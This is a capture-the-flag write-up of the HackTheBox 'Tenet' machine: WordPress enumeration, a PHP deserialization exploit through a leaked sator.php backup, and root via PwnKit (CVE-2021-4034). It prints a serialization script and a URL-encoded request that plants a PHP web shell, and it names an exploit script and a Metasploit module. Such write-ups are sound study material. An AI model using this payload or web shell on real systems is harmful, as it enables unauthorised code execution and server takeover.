---
title: "HackTheBox: Tenet Notes"
slug: nmvt4o
translationKey: nmvt4o
date: 2022-03-06T23:14:53+08:00
source: yuque/penetration
---

+ Tenet	10.10.10.223
+ [https://app.hackthebox.com/machines/Tenet/](https://app.hackthebox.com/machines/Tenet/)

```basic
export ip=10.10.10.223 && export url=http://10.10.10.223:80 && echo ok
```

# Information Gathering
Nmap:

```basic
Nmap scan report for 10.10.10.223
  Host is up (1.1s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
  |   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
  |_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-methods: 
  |_  Supported Methods: GET POST OPTIONS HEAD
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Directory scanning:

The scan found WordPress, which redirected to `tenet.htb`, so I added a hosts entry and fired up wpscan:

```bash
wpscan --url http://tenet.htb -e m,u 
```

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648134519909-58b80bb3-a9bf-4daf-9fff-6cd43deebddd.png)

Enumerated users:

```bash
neil
protagonist
```

Tried brute-forcing with fasttrac.txt, without success.

While browsing around, I found a hint at [http://tenet.htb/index.php/comments/feed/](http://tenet.htb/index.php/comments/feed/):

```xml
<description><![CDATA[did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!]]></description>
<content:encoded><![CDATA[<p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p>
]]></content:encoded>
```

Ran dirsearch with `--suffix sator.php` — nothing there.

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648141422897-250322a5-358b-44af-8d27-baad7be14ed6.png)

Then a thought struck me out of nowhere — could it be...

+ [http://10.10.10.223/sator.php](http://10.10.10.223/sator.php)
+ [http://10.10.10.223/sator.php.bak](http://10.10.10.223/sator.php.bak)

Sure enough, when it comes to backup files it's `.bak` — so `.swp` doesn't even get a glance?

> See also:
>
> + [Filenames ending with a tilde (~) on Linux](https://blog.csdn.net/zzukun/article/details/49561097)
> + [How .swp files are created on Linux and how to deal with them](https://blog.csdn.net/qq_42200183/article/details/81531422)
>



A quick look at the code shows a deliberate deserialization.

> The `__destruct` function is triggered when an object is destroyed — which in practice means the deserialized object being destroyed after deserialization.

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648135604274-5740db20-439e-473e-a99b-718688eaabf6.png)

I initially misread this part (~~thinking the `$data` variable was overwritten~~). Note that:

+ The variable initialized on line 24 has a very long name and **is never used again in the code afterward**.
+ Lines 26 and 27 are of no practical value for the attack.
+ After the code finishes, the object created by deserialization is destroyed, triggering the `__destruct` method — which is the shell write.



Since we control both the filename and the file contents, simply generate the serialized payload, send it over, and we get a shell written.

```php
<?php
class DatabaseExport
{
  public function __construct()
  {
    $this->user_file = 'suck.php';
    $this->data = '<?php system($_GET[1]);?>';
  }
}

$app = new DatabaseExport;
$databaseupdate = serialize($app);
echo $databaseupdate;

?>
```

```php
http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:8:%22suck.php%22;s:4:%22data%22;s:25:%22%3C?php%20system($_GET[1]);?%3E%22;}
```

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648135836994-a825bc76-9b53-4408-9496-afad7509bab1.png)

---

# Privilege Escalation
After landing the `www-data` user, I learned there was a `<font style="color:rgb(0, 0, 0);">neil</font>`<font style="color:rgb(0, 0, 0);"> user, so I started hunting for privilege escalation leads (I also ran msf's infogather module along the way — useless)</font>

```php
[+] Info:
[+]     Ubuntu 18.04.5 LTS
[+]     Linux tenet 4.15.0-129-generic #132-Ubuntu SMP Thu Dec 10 14:02:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[+]     Module running as "neil" user
```

Read `wordpress/wp-config.php`, got the password `Opera2112`, and successfully got in as `neil`:

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648138080432-7043b8cc-8e04-4654-bd95-e34e0ca14e86.png)



Next, to escalate to root: took a quick look at cron jobs and file interfaces, found nothing suspicious, then searched for files with the SUID bit set:

```bash
find / -perm -u=s 2> /dev/null
```

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648138699154-8bd66a54-bae0-4c86-8f7a-8fa98a759c8b.png)

Seeing polkit, I recalled there seemed to be an LPE vulnerability, and found [CVE-2021-4034](https://gitcode.net/mirrors/nikaiw/CVE-2021-4034/-/blob/master/cve2021-4034.py)

There was actually a Python3 environment on the box — very deliberate.

![](https://cdn.nlark.com/yuque/0/2022/png/166008/1648139420074-15ac6539-c8fe-43fc-bd05-cebac7ef8be4.png)

Pwned.

---

# Retrospective
+ Configure a wpscan API token — it's the more reliable approach
+ wpscan brute-force command:

```bash
wpscan --url [] -U uli -P pli -t 10
```

## Polkit Privilege Escalation Vulnerability (PwnKit)
+ **Commands to verify whether the vulnerability exists**
    - `dpkg -l policykit*` — note it's not "polkit" anymore (the wildcard `*` also works)
    - `rpm -qa | grep polkit`

> The two most common ways to install software in the Linux world are:
>
> 
>
> **dpkg** :
>
> This mechanism was originally developed by the Debian Linux community. Through the dpkg mechanism, software provided by Debian can be installed easily, and it also provides information about installed software — quite handy indeed. Most Linux distributions derived from Debian use dpkg to manage their software, including B2D, Ubuntu, and others.
>
> 
>
> **RPM** :
>
> This mechanism was originally developed by Red Hat, and since it turned out to be really useful, many distributions adopted it as their software installation management mechanism, including well-known vendors such as Fedora, CentOS, and SuSE.
>

    - pkexec --version

```bash
neil@tenet:/var/www/html$ dpkg -l policykit-1
...
policykit-1   0.105-20ubuntu0.1 amd64
...


neil@tenet:/var/www/html$ pkexec --version
pkexec version 0.105
neil@tenet:/var/www/ht
```



**Keep msf up to date**

+ `cve_2021_4034_pwnkit_lpe_pkexec.rb` only made it into msf in January 2022; the old version I was using didn't have it.
+ It is indeed reliably exploitable:

![](https://cdn.nlark.com/yuque/0/2022/png/1648140447195-eef13aba-fe7e-4b35-b463-3a24780f7e93.png)

+ I recommend reading msf's exploit code, especially the [check part](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/cve_2021_4034_pwnkit_lpe_pkexec.rb#L121) — it's essentially just version matching, but the craftsmanship is still impressive!

---

# Refs
+ [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/cve_2021_4034_pwnkit_lpe_pkexec.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/cve_2021_4034_pwnkit_lpe_pkexec.rb)
+ [CVE-2021-4034: Linux Polkit Privilege Escalation Vulnerability Reproduction and Fix](https://blog.csdn.net/laobanjiull/article/details/122715651)
